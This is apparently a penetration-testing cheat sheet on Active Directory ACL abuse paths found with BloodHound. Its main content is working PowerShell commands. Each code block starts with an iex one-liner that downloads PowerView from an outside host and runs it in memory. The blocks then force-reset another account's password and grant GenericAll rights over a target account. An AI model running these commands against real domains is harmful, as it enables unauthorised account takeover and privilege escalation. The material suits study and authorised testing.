# ACL Abuse

In Bloodhound output, here is a list of attack that you could do.

* **GenericAll to Domain Controller Machine Account** - Resouces Based Constrained Delegation Attack.&#x20;
* **GenericAll to a user account** - Resetting Password&#x20;

{% code overflow="wrap" %}
```bash
# Import PowerView
PS> iex (new-Object Net.WebClient).DownloadString('http://10.8.0.251/privesc/PowerView.ps1')|Import-Module PowerView.ps1
 
# Assume that Amelia.Griffiths account is a member of 'Legacy' group, whicn has a WriteDACL privilege ot GPOADM account. 
# You are logged on as Amelia.Griffiths. 
# This gives the GenericlAll privilege to Amelia.Griffiths targetting to GPOADM. 

 PS> $UserPassword = ConvertTo-SecureString 'Password0-' -AsPlainText -Force
 PS> Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword
```
{% endcode %}

* **WriteDACL to a user account** - Adding GenericAll to the account, targeting to another account. &#x20;

{% code overflow="wrap" %}
```bash
# Import PowerView
PS> iex (new-Object Net.WebClient).DownloadString('http://10.8.0.251/privesc/PowerView.ps1')|Import-Module PowerView.ps1
 
# Assume that Amelia.Griffiths account is a member of 'Legacy' group, whicn has a WriteDACL privilege ot GPOADM account. 
# You are logged on as Amelia.Griffiths. 
# This gives the GenericlAll privilege to Amelia.Griffiths targetting to GPOADM. 

PS> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "GPOADM" -PrincipalIdentity "Amelia.Griffiths" -Verbose
```
{% endcode %}

